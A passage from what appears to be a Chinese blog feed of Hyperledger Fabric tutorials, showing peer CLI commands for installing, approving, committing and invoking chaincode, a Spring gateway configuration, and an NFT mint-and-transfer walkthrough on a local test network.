CORE_PEER_TLS_ROOTCERT_FILE=<span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/</span>peers<span class="hljs-regexp">/peer0.org1.example.com/</span>tls/ca.crt<br>export CORE_PEER_ADDRESS=localhost:<span class="hljs-number">7051</span><br><span class="hljs-comment">#approveformyorg定义</span><br>peer lifecycle chaincode approveformyorg -o localhost:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer.example.com --channelID mychannel --name hyperledger-fabric-app-java-demo --version <span class="hljs-number">2.0</span> --package-id <span class="hljs-variable">$NEW_CC_PACKAGE_ID</span> --sequence <span class="hljs-number">2</span> --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem<br></code></pre></td></tr></table></figure><h4 id="1-5-将链码提交给通道"><a href="#1-5-将链码提交给通道" class="headerlink" title="1.5 将链码提交给通道"></a>1.5 将链码提交给通道</h4><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gradle">#使用checkcommitreadiness来检查是否已经批准相同的链码定义：<br>peer lifecycle chaincode checkcommitreadiness --channelID mychannel --name hyperledger-fabric-app-java-demo --version <span class="hljs-number">2.0</span> --sequence <span class="hljs-number">2</span> --tls --cafile $&#123;PWD&#125;<span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem --output json<br><br><span class="hljs-keyword">return</span>如下则表示准许通过<br>&#123;<br><span class="hljs-string">&quot;approvals&quot;</span>: &#123;<br><span class="hljs-string">&quot;Org1MSP&quot;</span>: <span class="hljs-keyword">true</span>,<br><span class="hljs-string">&quot;Org2MSP&quot;</span>: <span class="hljs-keyword">true</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>升级链码:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">peer lifecycle chaincode commit -o localhost:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer.example.com --channelID mychannel --name hyperledger-fabric-app-java-demo --version <span class="hljs-number">1.0</span> --sequence <span class="hljs-number">1</span> --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem --peerAddresses localhost:<span class="hljs-number">7051</span> --tlsRootCertFiles <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/</span>peers<span class="hljs-regexp">/peer0.org1.example.com/</span>tls<span class="hljs-regexp">/ca.crt --peerAddresses localhost:9051 --tlsRootCertFiles $&#123;PWD&#125;/</span>organizations<span class="hljs-regexp">/peerOrganizations/</span>org2.example.com<span class="hljs-regexp">/peers/</span>peer0.org2.example.com<span class="hljs-regexp">/tls/</span>ca.crt<br></code></pre></td></tr></table></figure><p>可以使用peer lifecycle chaincode querycommitted命令来确认链码定义已提交给通道。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">peer lifecycle chaincode querycommitted --channelID mychannel --name hyperledger-fabric-app-java-demo --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem<br></code></pre></td></tr></table></figure><p>成功返回链码的定义顺序和版本之后可以调用链码进行测试</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">peer chaincode invoke -o localhost:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer.example.com --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem -C mychannel -n chaincode_demo_1 --peerAddresses localhost:<span class="hljs-number">7051</span> --tlsRootCertFiles <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/</span>peers<span class="hljs-regexp">/peer0.org1.example.com/</span>tls<span class="hljs-regexp">/ca.crt --peerAddresses localhost:9051 --tlsRootCertFiles $&#123;PWD&#125;/</span>organizations<span class="hljs-regexp">/peerOrganizations/</span>org2.example.com<span class="hljs-regexp">/peers/</span>peer0.org2.example.com<span class="hljs-regexp">/tls/</span>ca.crt -c <span class="hljs-string">&#x27;&#123;&quot;function&quot;:&quot;createCat&quot;,&quot;Args&quot;:[&quot;cat-KEY&quot;,&quot;test - KEY&quot;,12, &quot;red&quot;, &quot;aaa&quot;]&#125;&#x27;</span><br><br>peer chaincode query -C mychannel -n hyperledger-fabric-contract-java-demo -c <span class="hljs-string">&#x27;&#123;&quot;Args&quot;:[&quot;queryCat&quot; , &quot;cat-0&quot;]&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="2-定义fabric-gateway-java的配置文件"><a href="#2-定义fabric-gateway-java的配置文件" class="headerlink" title="2.定义fabric-gateway-java的配置文件"></a>2.定义fabric-gateway-java的配置文件</h3><p>参考<a href="%22https://github.com/hyperledger/fabric-gateway-java/blob/main/src/test/java/org/hyperledger/fabric/gateway/connection.json%22">gateway的github</a></p><p><img src="/2022/03/29/fabric-gateway-java/image-20220330205633378.png" alt="image-20220330205633378"></p><p>其中需要修改的地方有两点</p><ul><li>crypto-config中的证书文件需要替换启动环境中的文件</li><li>networkConnection可以copygithub中的例子，其中与peer节点交互的ip需改成虚拟机中的IP</li></ul><p>其中application.properties中的内容为</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 应用名称</span><br>spring.application.name=hyperledger-fabric-app-java-demo<br><span class="hljs-comment"># 应用服务 WEB 访问端口</span><br>server.port=<span class="hljs-number">8080</span><br><br><span class="hljs-comment">#网络配置</span><br>fabric.networkConnectionConfigPath=src<span class="hljs-regexp">/main/</span>resources/networkConnection.json<br><span class="hljs-comment">#证书路径</span><br>fabric.certificatePath=src<span class="hljs-regexp">/main/</span>resources<span class="hljs-regexp">/crypto-config/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/u</span>sers<span class="hljs-regexp">/User1@org1.example.com/m</span>sp<span class="hljs-regexp">/signcerts/</span>User1@org1.example.com-cert.pem<br><span class="hljs-comment">#私钥路径</span><br>fabric.privateKeyPath=src<span class="hljs-regexp">/main/</span>resources<span class="hljs-regexp">/crypto-config/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/u</span>sers<span class="hljs-regexp">/User1@org1.example.com/m</span>sp<span class="hljs-regexp">/keystore/</span>priv_sk<br><br>logging.level.org.hyperledger=trace<br></code></pre></td></tr></table></figure><p>Controller中获取的name也需要和虚拟机中启动的链码的name相对应</p><p><img src="/2022/03/29/fabric-gateway-java/image-20220330210328591.png" alt="image-20220330210328591"></p><p>写好直接启动进行测试即可，使用postman去调用gateway的接口和虚拟机中的区块链进行交互</p><p><img src="/2022/03/29/fabric-gateway-java/image-20220330210432218.png" alt="image-20220330210432218"></p><p><img src="/2022/03/29/fabric-gateway-java/image-20220330210441286.png" alt="image-20220330210441286"></p><p>使用PUT方法对应的invoke中的createCat方法，传递过去的值需要以json的格式满足代码中的要求，尝试创建一个相同的对象则会返回其已经存在。</p><p><img src="/2022/03/29/fabric-gateway-java/image-20220330210635136.png" alt="image-20220330210635136"></p><p><img src="/2022/03/29/fabric-gateway-java/image-20220330210708825.png" alt="image-20220330210708825"></p><p>其他查询更新删除方法也类似，更换发包的类型则可以实现不同的方法。</p><p><a href="https://gitee.com/kernelHP/hyperledger-fabric-app-java-demo.git">gateway方法源码</a></p><p><a href="%5Bhttps://github.com/hyperledger/fabric-gateway-java/blob/main/src/test/java/org/hyperledger/fabric/gateway/connection-tls.json%5D(https://gitee.com/link?target=https://github.com/hyperledger/fabric-gateway-java/blob/main/src/test/java/org/hyperledger/fabric/gateway/connection-tls.json)">connection.json配置文件参考</a></p><p><a href="https://gitee.com/kernelHP/hyperledger-fabric-contract-java-demo">智能合约源码</a></p><p><a href="https://blog.csdn.net/qq_28540443/article/details/104451259">SDK实践</a></p><p><a href="https://juejin.cn/post/6844904070390480910">设置背书策略</a></p>]]></content>
    
    
    <categories>
      
      <category>Blockchain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>chaincode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NFT铸造and交易</title>
    <link href="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/"/>
    <url>/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/</url>
    
    <content type="html"><![CDATA[<p>首先将智能合约打包并且上链部署(ps:参考合约部署.md)</p><p>使用fabric-ca-cline注册生成org1和org2，org1代表管理端(铸币端)，org2代表接受端并生成其身份证书文件和MSP文件</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327204309210.png" alt="image-20220327204309210"></p><p>org2端同理，先注册然后使用fabric-ca-cline enroll生成</p><h3 id="铸币阶段"><a href="#铸币阶段" class="headerlink" title="铸币阶段"></a>铸币阶段</h3><p>使用peer来为org1铸造一个NFT</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327205032216.png" alt="image-20220327205032216"></p><p>mint函数验证客户端是铸币者组织的成员然后为其生成一个不可替代的令牌，可以通过调用ClineAccountBalance函数来查看账户余额</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327205213760.png" alt="image-20220327205213760"></p><p>我们还可以通过调用 <code>OwnerOf</code> 函数来检查已发行令牌的所有者。</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327205257570.png" alt="image-20220327205257570"></p><h3 id="交易阶段"><a href="#交易阶段" class="headerlink" title="交易阶段"></a>交易阶段</h3><p>org1铸造者转账给org2，首先org2需要提供自己的账户ID作为收款地址，客户端可以从他们自己的公共证书中获取他们的账户ID，但是为了交易的准确和安全性，合约中ClientAccountID可以提供查看ID来将其作为账户ID</p><p>首先获取自己的ID</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327205720956.png" alt="image-20220327205720956"></p><p>org2接受者向org1提供其用户ID之后，铸币者可以发起从他们账户到接受者的交易。（要转移不可替代的代币，铸币者还需要提供自己的账户 ID）</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327205934990.png" alt="image-20220327205934990"></p><p>进行交易，发现返回结果为successful，表示转账成功</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327210302514.png" alt="image-20220327210302514"></p><p><code>TransferFrom</code> 函数验证给定不可替代令牌的所有权。<br>然后它将不可替代令牌的所有权从当前所有者更改为接收者。<br>它还将借记呼叫者的帐户并记入收件人的帐户。 请注意，示例合约将自动为接收者创建一个余额为零的账户，如果该账户尚不存在的话。</p><p>这时候在查询余额发现余额为0</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327210358289.png" alt="image-20220327210358289"></p><p>然后使用 Org2 终端，让我们请求接收者的余额：</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327210444083.png" alt="image-20220327210444083"></p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327210505718.png" alt="image-20220327210505718"></p><p>表示转账成功</p><h3 id="第三方转账-特定代币"><a href="#第三方转账-特定代币" class="headerlink" title="第三方转账 (特定代币)"></a>第三方转账 (特定代币)</h3><p>适用场景：</p><ul><li>铸币者已经根据上述场景创建了一个不可替代的代币。</li><li>同一铸币者客户端使用 <code>Approve</code> 功能授予运营商客户端代表铸币者转移具有特定代币 ID 的不可替代代币的权限。假设运营商已将其客户端 ID 提供给带外的“批准”呼叫者。</li><li>然后运营商客户端将使用“TransferFrom”功能代表铸币者将不可替代的代币转移到接收者的账户。假设接收方已将其客户端 ID 提供给带外的“TransferFrom”调用方。</li></ul><p>首先为第三方用户注册一个身份      test_1/test123</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327211908326.png" alt="image-20220327211908326"></p><p>为其生成身份证书andMSP文件夹</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327212001845.png" alt="image-20220327212001845"></p><p>将节点OU配置文件复制到MSP文件夹中</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/m</span>sp<span class="hljs-regexp">/config.yaml $&#123;PWD&#125;/</span>organizations<span class="hljs-regexp">/peerOrganizations/</span>org1.example.com<span class="hljs-regexp">/users/</span>operator@org1.example.com<span class="hljs-regexp">/msp/</span>config.yaml<br></code></pre></td></tr></table></figure><p>查询cline id可以看到id为test_1</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327212236738.png" alt="image-20220327212236738"></p><p>org1客户端发行一个NFT然后请求转移令牌</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327212633666.png" alt="image-20220327212633666"></p><p>然后可以通过Getapproved函数来检查运营商客户端的批准情况</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327212721379.png" alt="image-20220327212721379"></p><p>然后对代币进行交易</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327213928865.png" alt="image-20220327213928865"></p><p><code>TransferFrom</code> 函数验证与调用客户端 ID 关联的帐户是否有权代表当前所有者转移给定令牌。<br>然后它将不可替代令牌的所有权从当前所有者更改为接收者。<br>它还将借记前所有者的帐户并贷记收件人的帐户。<br>它还将删除运营商对铸币者批准的这种不可替代令牌的许可。<br>请注意，示例合约将自动为接收者创建一个余额为零的账户，如果该账户尚不存在的话。</p><p><b><font color="red">参考fabric-samples中token-erc-721例子中的README.md实现</font></b></p>]]></content>
    
    
    <categories>
      
      <category>Blockchain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>chaincode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安装链码</title>
    <link href="/2022/03/03/%E5%AE%89%E8%A3%85%E9%93%BE%E7%A0%81/"/>
    <url>/2022/03/03/%E5%AE%89%E8%A3%85%E9%93%BE%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h2 id="1-打包智能合约"><a href="#1-打包智能合约" class="headerlink" title="1. 打包智能合约"></a>1. 打包智能合约</h2><h3 id="1-1-进入test-network"><a href="#1-1-进入test-network" class="headerlink" title="1.1 进入test-network"></a>1.1 进入test-network</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cd</span> <span class="hljs-built_in">test-network</span><br></code></pre></td></tr></table></figure><h3 id="1-2-将bin目录中二进制文件添加环境变量"><a href="#1-2-将bin目录中二进制文件添加环境变量" class="headerlink" title="1.2 将bin目录中二进制文件添加环境变量"></a>1.2 将bin目录中二进制文件添加环境变量</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/../bin:$PATH<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">FABRIC_CFG_PATH</span>=<span class="hljs-variable">$PWD</span>/../config/<br></code></pre></td></tr></table></figure><h3 id="1-3-创建链码包"><a href="#1-3-创建链码包" class="headerlink" title="1.3 创建链码包"></a>1.3 创建链码包</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">peer lifecycle chaincode package java_gateway_demo.tar.gz <span class="hljs-params">--path</span> <span class="hljs-string">../java_gateway/</span> <span class="hljs-params">--lang</span> java <span class="hljs-params">--label</span> java_gateway_demo_1<br></code></pre></td></tr></table></figure><h2 id="2-安装链码"><a href="#2-安装链码" class="headerlink" title="2. 安装链码"></a>2. 安装链码</h2><p>打包java_gateway_demo智能合约后，在peer节点上安装链码。需要在将认可交易的每个peer节点上安装链码。因为我们将设置背书策略以要求来自Org1和Org2的背书，所以我们需要在两个组织的peer节点上安装链码</p><h3 id="2-1-Org1-peer节点安装链码"><a href="#2-1-Org1-peer节点安装链码" class="headerlink" title="2.1 Org1 peer节点安装链码"></a>2.1 Org1 peer节点安装链码</h3><p>设置以下环境变量，以Org1身份操作peer cli</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ENABLED</span>=<span class="hljs-literal">true</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_LOCALMSPID</span>=<span class="hljs-string">&quot;Org1MSP&quot;</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ROOTCERT_FILE</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_MSPCONFIGPATH</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_ADDRESS</span>=localhost:7051<br><span class="hljs-comment"># peer lifecycle chaincode安装链码</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">peer </span>lifecycle chaincode install java_gateway_demo.tar.gz<br></code></pre></td></tr></table></figure><h3 id="2-2-Org2-peer节点安装链码"><a href="#2-2-Org2-peer节点安装链码" class="headerlink" title="2.2 Org2 peer节点安装链码"></a>2.2 Org2 peer节点安装链码</h3><p>设置以下环境变量，以Org2身份操作peer CLI</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_LOCALMSPID</span>=<span class="hljs-string">&quot;Org2MSP&quot;</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ROOTCERT_FILE</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ROOTCERT_FILE</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_MSPCONFIGPATH</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_ADDRESS</span>=localhost:9051<br><span class="hljs-comment"># peer lifecycle chaincode安装链码</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">peer </span>lifecycle chaincode install java_gateway_demo.tar.gz<br></code></pre></td></tr></table></figure><strong><font color="red">注意：安装链码时，链码由peer节点构建。如果智能合约代码有问题，install命令将从链码中返回所有构建错误。因为安装 java 链码的时候需要经过 maven 构建以及下载依赖包的过程这个过程有可能会较慢，所以 install 命令有可能会返回一个超时错误:。但是其实链码的 docker 容器内此时还在执行构建任务没有完成。等到构建成功了链码包也就安装成功了。</font></strong><h2 id="3-通过链码定义"><a href="#3-通过链码定义" class="headerlink" title="3 通过链码定义"></a>3 通过链码定义</h2><p>安装链码包后，需要通过组织的链码定义。该定义包括链码管理的重要参数，例如名称，版本和链码认可策略。</p><p>如果组织已在其peer节点上安装了链码，则他们需要在其组织通过的链码定义中包括包ID。包ID用于将peer节点上安装的链码与通过的链码定义相关联，并允许组织使用链码来认可交易。</p><h3 id="3-1-查询包ID"><a href="#3-1-查询包ID" class="headerlink" title="3.1 查询包ID"></a>3.1 查询包ID</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">peer lifecycle chaincode queryinstalled</span><br></code></pre></td></tr></table></figure><p>通过链码时，我们将使用包ID，因此，将包ID保存为环境变量。将返回的包ID粘贴到下面的命令中。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span>-demo_<span class="hljs-number">1</span>:cf<span class="hljs-number">57</span>bbad<span class="hljs-number">4747</span>cb<span class="hljs-number">1</span>eb<span class="hljs-number">45</span>ae<span class="hljs-number">22</span>fd<span class="hljs-number">95</span>f<span class="hljs-number">6</span>e<span class="hljs-number">7</span>aa<span class="hljs-number">04</span>a<span class="hljs-number">72</span>df<span class="hljs-number">4</span>d<span class="hljs-number">109518</span>f<span class="hljs-number">5</span>a<span class="hljs-number">7</span>e<span class="hljs-number">31</span>a<span class="hljs-number">657</span>fa<span class="hljs-number">442</span><br><span class="hljs-comment">#链码id</span><br><span class="hljs-attribute">export</span> CC_PACKAGE_ID=java_gateway_demo_<span class="hljs-number">1</span>:cf<span class="hljs-number">57</span>bbad<span class="hljs-number">4747</span>cb<span class="hljs-number">1</span>eb<span class="hljs-number">45</span>ae<span class="hljs-number">22</span>fd<span class="hljs-number">95</span>f<span class="hljs-number">6</span>e<span class="hljs-number">7</span>aa<span class="hljs-number">04</span>a<span class="hljs-number">72</span>df<span class="hljs-number">4</span>d<span class="hljs-number">109518</span>f<span class="hljs-number">5</span>a<span class="hljs-number">7</span>e<span class="hljs-number">31</span>a<span class="hljs-number">657</span>fa<span class="hljs-number">442</span><br></code></pre></td></tr></table></figure><h3 id="3-2-Org2-通过链码定义"><a href="#3-2-Org2-通过链码定义" class="headerlink" title="3.2 Org2 通过链码定义"></a>3.2 Org2 通过链码定义</h3><p>因为已经设置了环境变量为peer CLI作为Orig2管理员进行操作，所以我们可以以Org2组织级别将 java_gateway_demo 的链码定义通过。使用 peer lifecycle chaincode approveformyorg命令通过链码定义：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">peer lifecycle chaincode approveformyorg -o localhost:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer.example.com --channelID mychannel --name java_gateway_demo_1 --version <span class="hljs-number">1.0</span> --package-id <span class="hljs-variable">$CC_PACKAGE_ID</span> --sequence <span class="hljs-number">1</span> --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem<br></code></pre></td></tr></table></figure><h3 id="3-3Org1-通过链码定义"><a href="#3-3Org1-通过链码定义" class="headerlink" title="3. 3Org1 通过链码定义"></a>3. 3Org1 通过链码定义</h3><p>设置以下环境变量以Org1管理员身份运行：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_LOCALMSPID</span>=<span class="hljs-string">&quot;Org1MSP&quot;</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_MSPCONFIGPATH</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ROOTCERT_FILE</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_ADDRESS</span>=localhost:7051<br></code></pre></td></tr></table></figure><p>用 peer lifecycle chaincode approveformyorg命令通过链码定义</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">peer lifecycle chaincode approveformyorg -o localhost:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer.example.com --channelID mychannel --name java_gateway_demo_1 --version <span class="hljs-number">1.0</span> --package-id <span class="hljs-variable">$CC_PACKAGE_ID</span> --sequence <span class="hljs-number">1</span> --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem<br></code></pre></td></tr></table></figure><h2 id="4-将链码定义提交给通道"><a href="#4-将链码定义提交给通道" class="headerlink" title="4 将链码定义提交给通道"></a>4 将链码定义提交给通道</h2><p>使用peer lifecycle chaincode checkcommitreadiness命令来检查通道成员是否已批准相同的链码定义：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">peer lifecycle chaincode checkcommitreadiness --channelID mychannel --name java_gateway_demo_1 --version <span class="hljs-number">1.0</span> --sequence <span class="hljs-number">1</span> --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem --output json<br></code></pre></td></tr></table></figure><p>该命令将生成一个JSON映射，该映射显示通道成员是否批准了checkcommitreadiness命令中指定的参数：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br><span class="hljs-attr">&quot;approvals&quot;</span>: &#123;<br><span class="hljs-attr">&quot;Org1MSP&quot;</span>: <span class="hljs-literal">true</span>,<br><span class="hljs-attr">&quot;Org2MSP&quot;</span>: <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><strong><font color="red">由于作为通道成员的两个组织都同意了相同的参数，因此链码定义已准备好提交给通道。你可以使用peer lifecycle chaincode commit命令将链码定义提交到通道。commit命令还需要由组织管理员提交。</font></strong><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">peer lifecycle chaincode commit -o localhost:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer.example.com --channelID mychannel --name java_gateway_demo_1 --version <span class="hljs-number">1.0</span> --sequence <span class="hljs-number">1</span> --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span 